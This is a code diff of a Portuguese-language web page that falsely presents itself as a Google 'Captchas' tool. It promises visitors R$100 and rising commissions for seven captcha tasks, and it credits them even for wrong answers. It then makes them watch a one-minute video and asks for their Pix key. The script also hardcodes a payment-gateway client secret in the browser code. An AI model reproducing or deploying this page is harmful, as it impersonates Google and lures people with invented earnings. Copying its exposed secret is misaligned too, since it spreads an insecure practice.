@@ -4,18 +4,157 @@
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Google Captchas - Nova Ferramenta</title>
-    <link rel="stylesheet" href="assets/css/style.css">
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            margin: 0;
+            padding: 0;
+            background-color: #f5f5f5;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            min-height: 100vh;
+        }
+        .container {
+            max-width: 400px;
+            width: 100%;
+            padding: 20px;
+            background-color: white;
+            box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
+            position: relative;
+        }
+        picture img {
+            width: 100%;
+            height: auto;
+        }
+        .saldo {
+            background-color: #4caf50;
+            color: white;
+            padding: 10px;
+            text-align: center;
+            margin-top: 20px;
+            border-radius: 5px;
+            font-size: 1.5em;
+        }
+        .content {
+            margin: 20px 0;
+        }
+        .captcha {
+            display: flex;
+            justify-content: center;
+            margin-top: 20px;
+        }
+        .btn {
+            display: block;
+            width: 100%;
+            padding: 15px;
+            text-align: center;
+            border: none;
+            border-radius: 5px;
+            font-size: 1.2em;
+            cursor: pointer;
+            margin-top: 20px;
+        }
+        .btn-green {
+            background-color: #4caf50;
+            color: white;
+        }
+        .btn-red {
+            background-color: #f44336;
+            color: white;
+        }
+        .btn:disabled {
+            background-color: #ccc;
+            cursor: not-allowed;
+        }
+        .error {
+            color: red;
+            text-align: center;
+            margin-top: 20px;
+        }
+        .progresso {
+            text-align: center;
+            margin-top: 20px;
+            font-size: 1.2em;
+        }
+        .popup {
+            display: none;
+            position: absolute;
+            top: 50%;
+            left: 50%;
+            transform: translate(-50%, -50%);
+            background-color: white;
+            padding: 20px;
+            box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
+            text-align: center;
+            border-radius: 5px;
+            z-index: 1000;
+        }
+        .popup img {
+            width: 50px;
+            height: 50px;
+        }
+        .popup-correct {
+            color: green;
+        }
+        .popup-wrong {
+            color: red;
+        }
+        .task-value {
+            text-align: center;
+            margin: 10px 0;
+            font-size: 1.2em;
+            font-weight: bold;
+        }
+        .progress-bar {
+            width: 100%;
+            background-color: #f3f3f3;
+            border-radius: 5px;
+            margin-top: 20px;
+        }
+        .progress-bar-fill {
+            height: 20px;
+            width: 0;
+            background-color: #4caf50;
+            border-radius: 5px;
+            text-align: center;
+            color: white;
+            line-height: 20px;
+        }
+        @media (max-width: 600px) {
+            .container {
+                padding: 10px;
+            }
+            .saldo {
+                font-size: 1.2em;
+            }
+            .btn {
+                font-size: 1em;
+                padding: 10px;
+            }
+        }
+    </style>
+    <link rel="preload" href="https://scripts.converteai.net/35808f69-9b9a-479d-a83c-7e4ac709ac71/players/663fd09d62dd4d000b35368e/player.js" as="script">
+    <link rel="preload" href="https://cdn.converteai.net/lib/js/smartplayer/v1/smartplayer.min.js" as="script">
+    <link rel="preload" href="https://images.converteai.net/35808f69-9b9a-479d-a83c-7e4ac709ac71/players/663fd09d62dd4d000b35368e/thumbnail.jpg" as="image">
+    <link rel="preload" href="https://cdn.converteai.net/35808f69-9b9a-479d-a83c-7e4ac709ac71/663fd08d4cd641000b73e481/main.m3u8" as="fetch">
+    <link rel="dns-prefetch" href="https://cdn.converteai.net">
+    <link rel="dns-prefetch" href="https://scripts.converteai.net">
+    <link rel="dns-prefetch" href="https://images.converteai.net">
+    <link rel="dns-prefetch" href="https://api.vturb.com.br">
 </head>
 <body>
-    <div class="container active" id="page1">
+    <div class="container" id="page1">
         <picture>
             <source srcset="assets/img/img1.webp" type="image/webp">
             <source srcset="assets/img/img1.png" type="image/png">
             <img src="assets/img/img1.png" alt="Google Captchas">
         </picture>
-        <div class="saldo" id="saldo">Saldo: R$100,00</div>
+        <div class="saldo" id="saldo">
+            Saldo: R$100,00
+        </div>
         <div class="content">
-            <h2>Parabéns, você foi selecionado!</h2>
+            <h2 style="font-size: 21px;">Parabéns, você foi selecionado!</h2>
             <p>O Google Captchas precisa de você para aumentar a segurança dos seus sites analisando se os Captchas estão marcados corretamente ou incorretamente.</p>
             <p>Você acaba de receber acesso à nova ferramenta do Google para análise de Captchas. <b>Aproveite, você já ganhou R$100,00</b>!</p>
             <p>Complete 7 Tarefas Simples e realize seu primeiro saque em minutos.</p>
@@ -28,18 +167,91 @@
         <div class="error" id="errorMessage"></div>
     </div>
 
-    <!-- Outras páginas omitidas para brevidade... -->
-
-    <div class="container" id="withdrawPage">
+    <div class="container" id="page2" style="display: none;">
         <picture>
             <source srcset="assets/img/img1.webp" type="image/webp">
             <source srcset="assets/img/img1.png" type="image/png">
             <img src="assets/img/img1.png" alt="Google Captchas">
         </picture>
-        <div class="saldo" id="withdrawSaldo">Saldo: R$100,00</div>
+        <div class="saldo" id="taskSaldo">
+            Saldo: R$100,00
+        </div>
+        <div class="progresso" id="progresso">
+            Tarefa 1 de 7
+        </div>
+        <div class="task-value" id="taskValue">Valor da Tarefa: R$15,00</div>
+        <div class="content">
+            <p id="taskText">Tarefa: Visualize a imagem abaixo e informe se nos blocos marcados contém veículos.</p>
+        </div>
+        <picture>
+            <source id="taskImageWebp" type="image/webp">
+            <source id="taskImagePng" type="image/png">
+            <img id="taskImage" alt="Captcha com veículos">
+        </picture>
+        <div class="progress-bar">
+            <div class="progress-bar-fill" id="progressBarFill">0%</div>
+        </div>
+        <button class="btn btn-green" id="yesButton">Sim</button>
+        <button class="btn btn-red" id="noButton">Não</button>
+        <div class="error" id="errorMessagePage2"></div>
+    </div>
+
+    <div class="container" id="tasksCompletedPage" style="display: none;">
+        <picture>
+            <source srcset="assets/img/img1.webp" type="image/webp">
+            <source srcset="assets/img/img1.png" type="image/png">
+            <img src="assets/img/img1.png" alt="Google Captchas">
+        </picture>
+        <div class="saldo" id="completedSaldo">
+            Saldo: R$100,00
+        </div>
+        <div class="content">
+            <img src="assets/img/verificado.png" alt="Verificado" style="max-width: 70px; margin: 0 auto; display: block;">
+            <h2 style="font-size: 21px; text-align: center;">Tarefas Concluídas!</h2>
+            <p>Parabéns, as tarefas foram concluídas com sucesso! Agora, assista um rápido vídeo para estar podendo realizar o seu saque de forma imediata.</p>
+            <p>Toque no botão abaixo para assistir o vídeo e realizar o seu saque.</p>
+        </div>
+        <button class="btn btn-green" id="goToVideoButton">Assistir Vídeo</button>
+    </div>
+
+    <div class="container" id="pageFinal" style="display: none;">
+        <picture>
+            <source srcset="assets/img/img1.webp" type="image/webp">
+            <source srcset="assets/img/img1.png" type="image/png">
+            <img src="assets/img/img1.png" alt="Google Captchas">
+        </picture>
+        <div class="saldo" id="finalSaldo">
+            Saldo: R$100,00
+        </div>
+        <div class="content">
+            <p>O saque será liberado ao final deste vídeo! Assista e entenda como funciona o Google Captcha e porque você está sendo pago para melhorar a segurança de nossa ferramenta.</p>
+            <div id="vid_663fd09d62dd4d000b35368e" style="position:relative;width:100%;padding: 177.77777777777777% 0 0;">
+                <img id="thumb_663fd09d62dd4d000b35368e" src="https://images.converteai.net/35808f69-9b9a-479d-a83c-7e4ac709ac71/players/663fd09d62dd4d000b35368e/thumbnail.jpg" style="position:absolute;top:0;left:0;width:100%;height:100%;object-fit:cover;display:block;">
+                <div id="backdrop_663fd09d62dd4d000b35368e" style="position:absolute;top:0;width:100%;height:100%;-webkit-backdrop-filter:blur(5px);backdrop-filter:blur(5px);"></div>
+            </div>
+            <script type="text/javascript" id="scr_663fd09d62dd4d000b35368e">
+                var s=document.createElement("script");
+                s.src="https://scripts.converteai.net/35808f69-9b9a-479d-a83c-7e4ac709ac71/players/663fd09d62dd4d000b35368e/player.js", s.async=!0,document.head.appendChild(s);
+            </script>
+            <style>
+                .elementor-element:has(#smartplayer) { width: 100%; }
+            </style>
+            <button class="btn btn-green" id="withdrawButton" style="display:none;">Realizar Saque Agora</button>
+        </div>
+    </div>
+
+    <div class="container" id="withdrawPage" style="display: none;">
+        <picture>
+            <source srcset="assets/img/img1.webp" type="image/webp">
+            <source srcset="assets/img/img1.png" type="image/png">
+            <img src="assets/img/img1.png" alt="Google Captchas">
+        </picture>
+        <div class="saldo" id="withdrawSaldo">
+            Saldo: R$100,00
+        </div>
         <div class="content">
             <p>Insira sua chave pix abaixo para sacar suas comissões das tarefas concluidas do Google Captcha e poder continuar realizando novas tarefas.</p>
-            <form id="pixForm" action="https://api.captchapay.org/captcha/process_payment.php" method="post">
+            <form id="pixForm">
                 <label for="pixType">Tipo de Chave Pix:</label>
                 <select id="pixType" name="pixType" required>
                     <option value="cpf">CPF</option>
@@ -54,7 +266,156 @@
         </div>
     </div>
 
+    <div class="popup" id="popup">
+        <img id="popupIcon" src="" alt="Icon">
+        <p id="popupText"></p>
+    </div>
+    
     <script src="https://www.google.com/recaptcha/api.js"></script>
-    <script src="assets/js/script.js"></script>
+    <script>
+        const tasks = [
+            { imageWebp: 'assets/img/captcha1.webp', imagePng: 'assets/img/captcha1.png', text: 'Tarefa: Visualize a imagem abaixo e informe se nos blocos marcados contém veículos.', answer: 'sim' },
+            { imageWebp: 'assets/img/captcha2.webp', imagePng: 'assets/img/captcha2.png', text: 'Tarefa: Visualize a imagem abaixo e informe se nos blocos marcados contém pessoas.', answer: 'sim' },
+            { imageWebp: 'assets/img/captcha3.webp', imagePng: 'assets/img/captcha3.png', text: 'Tarefa: Visualize a imagem abaixo e informe se nos blocos marcados contém casas.', answer: 'não' },
+            { imageWebp: 'assets/img/captcha4.webp', imagePng: 'assets/img/captcha4.png', text: 'Tarefa: Visualize a imagem abaixo e informe se nos blocos marcados contém motocicletas.', answer: 'sim' },
+            { imageWebp: 'assets/img/captcha5.webp', imagePng: 'assets/img/captcha5.png', text: 'Tarefa: Visualize a imagem abaixo e informe se nos blocos marcados contém animais.', answer: 'não' },
+            { imageWebp: 'assets/img/captcha6.webp', imagePng: 'assets/img/captcha6.png', text: 'Tarefa: Visualize a imagem abaixo e informe se nos blocos marcados contém semáforos.', answer: 'sim' },
+            { imageWebp: 'assets/img/captcha7.webp', imagePng: 'assets/img/captcha7.png', text: 'Tarefa: Visualize a imagem abaixo e informe se nos blocos marcados contém barcos.', answer: 'não' },
+        ];
+        let currentTask = 0;
+        let saldo = 100.00;
+
+        function updateTask() {
+            if (currentTask < tasks.length) {
+                const task = tasks[currentTask];
+                document.getElementById('taskImageWebp').srcset = task.imageWebp;
+                document.getElementById('taskImagePng').srcset = task.imagePng;
+                document.getElementById('taskImage').src = task.imagePng;
+                document.getElementById('taskText').innerText = task.text;
+                document.getElementById('progresso').innerText = `Tarefa ${currentTask + 1} de ${tasks.length}`;
+                document.getElementById('taskSaldo').innerText = `Saldo: R$${saldo.toFixed(2)}`;
+                let taskValue = (saldo * 0.15).toFixed(2);
+                document.getElementById('taskValue').innerText = `Valor da Tarefa: R$${taskValue}`;
+                updateProgressBar();
+            } else {
+                document.getElementById('page2').style.display = 'none';
+                document.getElementById('completedSaldo').innerText = `Saldo: R$${saldo.toFixed(2)}`;
+                document.getElementById('tasksCompletedPage').style.display = 'block';
+                new Audio('assets/audio/ok.mp3').play();
+            }
+        }
+
+        function updateProgressBar() {
+            const progress = ((currentTask + 1) / tasks.length) * 100;
+            const progressBarFill = document.getElementById('progressBarFill');
+            progressBarFill.style.width = `${progress}%`;
+            progressBarFill.innerText = `${progress.toFixed(0)}%`;
+        }
+
+        function showPopup(message, icon, isCorrect) {
+            const popup = document.getElementById('popup');
+            const popupText = document.getElementById('popupText');
+            const popupIcon = document.getElementById('popupIcon');
+            popupText.innerText = message;
+            popupIcon.src = icon;
+            popup.className = isCorrect ? 'popup popup-correct' : 'popup popup-wrong';
+            popup.style.display = 'block';
+            setTimeout(() => {
+                popup.style.display = 'none';
+            }, 3000);
+        }
+
+        function recaptchaCallback() {
+            document.getElementById('startButton').disabled = false;
+            document.getElementById('startButton').classList.add('btn-green');
+            new Audio('assets/audio/ok.mp3').play();
+        }
+
+        document.getElementById('startButton').addEventListener('click', function() {
+            if (grecaptcha.getResponse() === '') {
+                document.getElementById('errorMessage').innerText = 'Por favor, conclua o captcha antes de continuar.';
+            } else {
+                document.getElementById('page1').style.display = 'none';
+                document.getElementById('page2').style.display = 'block';
+                updateTask();
+            }
+        });
+
+        function validateAnswer(answer) {
+            const correct = tasks[currentTask].answer;
+            let message = '';
+            let icon = '';
+            if (answer === correct) {
+                const commission = (saldo * 0.15).toFixed(2);
+                saldo = parseFloat(saldo) + parseFloat(commission);
+                new Audio('assets/audio/dinheiro.mp3').play();
+                message = `Resposta Correta! Comissão de R$${commission} foi adicionada ao seu saldo, agora você tem R$${saldo.toFixed(2)}.`;
+                icon = 'assets/img/verificado.png';
+                showPopup(message, icon, true);
+            } else {
+                new Audio('assets/audio/erro.mp3').play();
+                message = `Resposta Errada! Comissão foi adicionada ao seu saldo, agora você tem R$${saldo.toFixed(2)}.`;
+                icon = 'assets/img/verificado.png';
+                showPopup(message, icon, false);
+            }
+            document.getElementById('taskSaldo').innerText = `Saldo: R$${saldo.toFixed(2)}`;
+            currentTask++;
+            updateTask();
+        }
+
+        document.getElementById('yesButton').addEventListener('click', function() {
+            validateAnswer('sim');
+        });
+
+        document.getElementById('noButton').addEventListener('click', function() {
+            validateAnswer('não');
+        });
+
+        document.getElementById('goToVideoButton').addEventListener('click', function() {
+            document.getElementById('tasksCompletedPage').style.display = 'none';
+            document.getElementById('pageFinal').style.display = 'block';
+            setTimeout(() => {
+                document.getElementById('withdrawButton').style.display = 'block';
+            }, 60000); // 1 minuto
+        });
+
+        document.getElementById('withdrawButton').addEventListener('click', function() {
+            document.getElementById('pageFinal').style.display = 'none';
+            document.getElementById('withdrawPage').style.display = 'block';
+            document.getElementById('withdrawSaldo').innerText = `Saldo: R$${saldo.toFixed(2)}`;
+        });
+
+        document.getElementById('pixForm').addEventListener('submit', function(event) {
+            event.preventDefault();
+            const pixKey = document.getElementById('pixKey').value;
+            const pixType = document.getElementById('pixType').value;
+            const data = {
+                client_id: 'wjmkt_1713979947271',
+                client_secret: '49d8d1419abe58357fa6ec5d4e562b302c6c661df14ff8b745b6b3376df4cb4c3478cd59160d456791aa555dcae974ee',
+                key_pix: pixKey,
+                key_type: pixType,
+                value: saldo.toFixed(2),
+            };
+
+            fetch('https://sandbox.ws.suitpay.app/api/v1/gateway/pix-payment', {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json',
+                },
+                body: JSON.stringify(data),
+            })
+            .then(response => response.json())
+            .then(data => {
+                if (data.success) {
+                    alert('Pagamento realizado com sucesso!');
+                } else {
+                    document.getElementById('pixErrorMessage').innerText = 'Erro ao realizar o pagamento. Tente novamente.';
+                }
+            })
+            .catch((error) => {
+                document.getElementById('pixErrorMessage').innerText = 'Erro ao realizar o pagamento. Tente novamente.';
+            });
+        });
+    </script>
 </body>
 </html>
